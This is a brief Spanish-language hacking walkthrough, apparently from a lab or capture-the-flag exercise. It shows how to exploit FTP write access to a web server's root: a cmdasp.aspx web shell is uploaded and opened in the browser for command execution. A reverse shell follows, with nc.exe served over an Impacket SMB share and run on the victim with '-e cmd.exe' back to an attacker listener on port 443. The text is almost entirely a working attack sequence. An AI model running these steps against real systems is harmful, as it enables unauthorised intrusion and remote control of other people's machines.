Consiste en que el puerto 21 (ftp) está vinculado al puerto 80 por lo cual podemos subir un archivo malicioso con extensión.aspx que nos de acceso remoto de comandos.

Kali linux ya tiene un archivo a si que para buscarlo:
```
find / -name cmdasp.aspx 2>/dev/null
```

Para traernos el archivo a la ruta en la cual estamos, copiamos la ruta del archivo y:
```
cp <ruta del archivo> .
```

nos metemos dentro del puerto 21(ftp) y subimos el archivo:
```
put cmdasp.aspx
```

vamos a nuestro navegador y ponemos: `<IP>/cmdasp.aspx`
y ya tendríamos acceso remoto de comandos.

Para conseguir intrusión remota a la máquina víctima hay que crearse un recurso compartido que aloje un netcat.exe y a partir de ahí conseguir entrar a la máquina víctima:
```
find / -name nc.exe 2>/dev/null
```

```
cp <ruta del archivo pero el binario> .
```

Para levantar el recurso compartido:
```
Impacket -smbserver recurso $(pwd) -smb2support
```

nos abrimos otra terminal y nos ponemos en escucha por el puerto 443.
```
nc -nlvp 443
```

En la wed donde podemos ejecutar comandos ponemos:
```
\\<myIP>\recurso\nc.exe -e cmd.exe <myIP> 443
```

Y ya estamos dentro.